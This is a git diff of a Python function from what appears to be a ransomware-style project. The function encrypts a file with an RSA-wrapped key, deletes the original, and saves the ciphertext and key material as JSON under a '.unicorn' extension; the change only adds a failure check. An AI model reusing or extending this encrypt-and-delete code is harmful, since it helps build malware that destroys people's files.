@@ -77,29 +77,32 @@ def generateKey():
 def encryptionProcess(fileName):
     RSA_Publickey_filepath=os.getcwd() + "/" + constant.PUBLIC_PEM
     RSACipher, C, IV, tag, ext = encrypt.MyRSAEncryptMAC(fileName, RSA_Publickey_filepath)
-    fName = os.path.splitext(os.path.basename(fileName))
+    if C != None:
+        fName = os.path.splitext(os.path.basename(fileName))
     
-    print(" > Managing files")
-    #Remove the initial file
-    os.remove(fileName)
+        print(" > Managing files")
+        #Remove the initial file
+        os.remove(fileName)
 
-    print(" > Generating top secret sensative magical unicorn")
-    #create a file with our custom extension so we can write into it
-    f = open((fName[0] + ".unicorn"), 'w')
+        print(" > Generating top secret sensative magical unicorn")
+        #create a file with our custom extension so we can write into it
+        f = open((fName[0] + ".unicorn"), 'w')
 
-    #dictionary that will be put into the json and into the fake file, unfortunately we can't put byte into json
-    #so we have to decode them (convert them to a non-byte)
-    topSecretStuff = {}
-    topSecretStuff["key"] = b64encode(RSACipher).decode('utf-8')
-    topSecretStuff["iv"] = b64encode(IV).decode('utf-8')
-    topSecretStuff["tag"] = b64encode(tag).decode('utf-8')
-    topSecretStuff["cipher"] = b64encode(C).decode('utf-8')
-    topSecretStuff["ext"] = ext
+        #dictionary that will be put into the json and into the fake file, unfortunately we can't put byte into json
+        #so we have to decode them (convert them to a non-byte)
+        topSecretStuff = {}
+        topSecretStuff["key"] = b64encode(RSACipher).decode('utf-8')
+        topSecretStuff["iv"] = b64encode(IV).decode('utf-8')
+        topSecretStuff["tag"] = b64encode(tag).decode('utf-8')
+        topSecretStuff["cipher"] = b64encode(C).decode('utf-8')
+        topSecretStuff["ext"] = ext
 
-    #put everything from the json into the file
-    json.dump(topSecretStuff, f)
-    #Close.... the json 
-    f.close()    
+        #put everything from the json into the file
+        json.dump(topSecretStuff, f)
+        #Close.... the json 
+        f.close()
+    else:
+        print("Encryption process failed")
 
 flag = True;
 
